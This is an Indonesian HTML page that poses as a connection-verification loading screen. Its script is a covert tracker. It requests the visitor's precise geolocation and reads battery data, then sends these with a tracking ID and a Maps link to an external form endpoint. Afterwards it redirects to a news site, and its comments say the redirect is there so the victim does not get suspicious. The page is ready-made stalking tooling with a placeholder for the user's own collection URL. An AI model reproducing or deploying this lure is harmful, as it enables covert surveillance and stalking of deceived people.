<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Konten...</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f4; margin: 0; }
        .container { text-align: center; color: #333; }
        .loader { border: 8px solid #e3e3e3; border-radius: 50%; border-top: 8px solid #3498db; width: 60px; height: 60px; animation: spin 1.5s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <h1>Harap Tunggu</h1>
    <p>Kami sedang memverifikasi koneksi Anda untuk pengalaman yang lebih baik.</p>
    <div class="loader"></div>
</div>

<script>
    const formsparkUrl = "https://submit-form.com/msQpfzNiX"; // <<<< GANTI DENGAN URL FORMSPARK ANDA

    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendPosition, showError, { enableHighAccuracy: true });
        } else {
            console.log("Geolocation tidak didukung.");
            redirectToFinalPage();
        }
    };

    function sendPosition(position) {
        // Ambil ID unik dari URL (misal: ?id=TesJakarta01)
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id') || 'Tidak Diketahui';

        navigator.getBattery().then(function(battery) {
            const payload = {
                id_pelacakan: trackingId,
                waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                akurasi: position.coords.accuracy.toFixed(2) + ' meter',
                baterai: (battery.level * 100).toFixed(0) + '%',
                sedang_charge: battery.charging ? 'Ya' : 'Tidak',
                link_gmaps: `https://maps.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
            };

            // Kirim semua data ke Formspark
            fetch(formsparkUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify(payload)
            })
            .catch(error => console.error('Error saat mengirim data:', error))
            .finally(redirectToFinalPage); // Apapun hasilnya, alihkan pengguna
        });
    }

    function showError(error) {
        console.warn(`ERROR (${error.code}): ${error.message}`);
        // Jika pengguna menolak, tetap alihkan agar tidak curiga
        redirectToFinalPage();
    }

    function redirectToFinalPage() {
        // Alihkan ke situs yang tidak mencurigakan, misalnya portal berita
        window.location.href = 'https://www.detik.com';
    }
</script>

</body>
</html>
